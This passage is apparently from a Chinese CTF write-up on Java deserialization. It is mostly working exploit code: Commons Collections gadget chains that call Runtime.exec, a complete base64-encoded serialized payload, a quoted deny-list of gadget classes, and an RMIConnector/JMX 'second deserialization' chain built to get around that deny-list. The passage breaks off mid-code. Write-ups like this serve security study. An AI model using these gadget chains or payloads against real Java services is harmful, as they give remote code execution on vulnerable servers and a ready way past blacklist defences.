sun.security.provider.certpath.X509CertPath;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.security.CodeSigner;  </span><br><span class="line"><span class="keyword">import</span> java.util.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ccExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        list.add(<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate1</span> <span class="operator">=</span> TransformedList.decorate(list, chainedTransformer);  </span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyList.decorate(decorate1, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(chainedTransformer));  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">ListOrderedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> (ListOrderedMap) ListOrderedMap.decorate(map);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get((Object) <span class="literal">null</span>);  </span><br><span class="line">        unsafe.putObject(decorated, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField(<span class="string">&quot;insertOrder&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">X509CertPath</span> <span class="variable">o</span> <span class="operator">=</span> (X509CertPath) unsafe.allocateInstance(X509CertPath.class);  </span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField(<span class="string">&quot;certs&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> unsafe.allocateInstance(CodeSigner.class);  </span><br><span class="line">        unsafe.putObject(o1, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField(<span class="string">&quot;signerCertPath&quot;</span>)), o);  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        vector.add(o1);  </span><br><span class="line">        unsafe.putObject(list2,unsafe.objectFieldOffset(list2.getClass().getDeclaredField(<span class="string">&quot;listenerList&quot;</span>)),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao).writeObject(list2);  </span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bao.toByteArray());  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin).readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            field = clazz.getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException var4) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;  </span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> field;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将base64编码内容，序列化<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075555-0kjgk9b.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdLE2xn2E6tZEAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy4ysheUxxykICAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAYamF2YS5zZWN1cml0eS5Db2RlU2lnbmVyXqL6Zsshmq0CAAJMAA5zaWduZXJDZXJ0UGF0aHQAHUxqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydFBhdGg7TAAJdGltZXN0YW1wdAAZTGphdmEvc2VjdXJpdHkvVGltZXN0YW1wO3hwc3IAK3N1bi5zZWN1cml0eS5wcm92aWRlci5jZXJ0cGF0aC5YNTA5Q2VydFBhdGhFP1T3TEUgtAIAAUwABWNlcnRzdAAQTGphdmEvdXRpbC9MaXN0O3hyABtqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydFBhdGhUN4mXfdPl+wIAAUwABHR5cGV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHBzcgAsb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3QuTGF6eUxpc3ToSpYmWppU8gIAAUwAB2ZhY3Rvcnl0AChMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL0ZhY3Rvcnk7eHIARW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5saXN0LkFic3RyYWN0U2VyaWFsaXphYmxlTGlzdERlY29yYXRvciVC5Cn2jXtrAwAAeHBzcgAzb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3QuVHJhbnNmb3JtZWRMaXN0DvL1W62zYVUCAAB4cgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbGxlY3Rpb24uVHJhbnNmb3JtZWRDb2xsZWN0aW9ueKFA96RzDpoCAAFMAAt0cmFuc2Zvcm1lcnQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHIAUW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb2xsZWN0aW9uLkFic3RyYWN0U2VyaWFsaXphYmxlQ29sbGVjdGlvbkRlY29yYXRvcla8EBO7pqE0AwAAeHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAXcEAAAAAXB4eHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3EAfgAJTAALaU1ldGhvZE5hbWVxAH4AFFsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cQB+AAsAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADFzcQB+ACt1cQB+AAsAAAACcHB0AAZpbnZva2V1cQB+ADEAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgALc3EAfgArdXEAfgALAAAAAXQABGNhbGN0AARleGVjdXEAfgAxAAAAAXEAfgA0eHNyADdvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRGYWN0b3J5zyQKt21bKggCAAFMAAlpQ29uc3RhbnRxAH4AJ3hwcQB+ACNwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBweAAAAAAAAABkcHg=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(s);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(decode));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075602-qjphq0h.png" alt="image"></p><p>可以看到这道题目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">String[] denyClasses = &#123; <span class="string">&quot;java.net.InetAddress&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sun.rmi.transport.tcp.TCPTransport&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sun.rmi.transport.LiveRef&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sun.rmi.server.UnicastServerRef&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sun.rmi.server.UnicastRemoteObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.map.TransformedMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.ConstantTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.MapTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.FactoryTransformer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.InstantiateFactory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.map.DefaultedMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.bag.TreeBag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.comparators.TransformingComparator&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.apache.commons.collections.functors.TransformerClosure&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.util.Hashtable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.util.HashMap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.net.URL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;java.security.SignedObject&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以使用rmi二次反序列化</p><h2 id="rmi二次反序列化"><a href="#rmi二次反序列化" class="headerlink" title="rmi二次反序列化"></a>rmi二次反序列化</h2><p>也就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.n1ght.javassist.TomcatEcho;</span><br><span class="line"><span class="keyword">import</span> com.n1ght.sink.SinkTools;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.LazyList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.TransformedList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.ListOrderedMap;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line"><span class="keyword">import</span> sun.security.provider.certpath.X509CertPath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.CodeSigner;  </span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ccExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> SinkTools.getTemplates(Repository.lookupClass(Exp.class).getBytes());</span><br><span class="line"><span class="comment">//        Object templates = SinkTools.getTemplates(TomcatEcho.testCalc());</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate1</span> <span class="operator">=</span> TransformedList.decorate(list, invokerTransformer);</span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyList.decorate(decorate1, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(templates));</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ListOrderedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> (ListOrderedMap) ListOrderedMap.decorate(map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get((Object) <span class="literal">null</span>);</span><br><span class="line">        unsafe.putObject(decorated, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField(<span class="string">&quot;insertOrder&quot;</span>)), decorate);</span><br><span class="line">        <span class="type">X509CertPath</span> <span class="variable">o</span> <span class="operator">=</span> (X509CertPath) unsafe.allocateInstance(X509CertPath.class);</span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField(<span class="string">&quot;certs&quot;</span>)), decorate);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> unsafe.allocateInstance(CodeSigner.class);</span><br><span class="line">        unsafe.putObject(o1, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField(<span class="string">&quot;signerCertPath&quot;</span>)), o);</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(o1);</span><br><span class="line">        unsafe.putObject(list2,unsafe.objectFieldOffset(list2.getClass().getDeclaredField(<span class="string">&quot;listenerList&quot;</span>)),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao).writeObject(list2);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(bao.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+getPayload());</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        list.add(<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate1</span> <span class="operator">=</span> TransformedList.decorate(list, invokerTransformer);</span><br><span class="line">        <span class="type">List</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyList.decorate(decorate1, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(rmiConnector));</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">ListOrderedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> (ListOrderedMap) ListOrderedMap.decorate(map);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get((Object) <span class="literal">null</span>);  </span><br><span class="line">        unsafe.putObject(decorated, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField(<span class="string">&quot;insertOrder&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">X509CertPath</span> <span class="variable">o</span> <span class="operator">=</span> (X509CertPath) unsafe.allocateInstance(X509CertPath.class);  </span><br><span class="line">        unsafe.putObject(o, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField(<span class="string">&quot;certs&quot;</span>)), decorate);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> unsafe.allocateInstance(CodeSigner.class);  </span><br><span class="line">        unsafe.putObject(o1, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField(<span class="string">&quot;signerCertPath&quot;</span>)), o);  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span 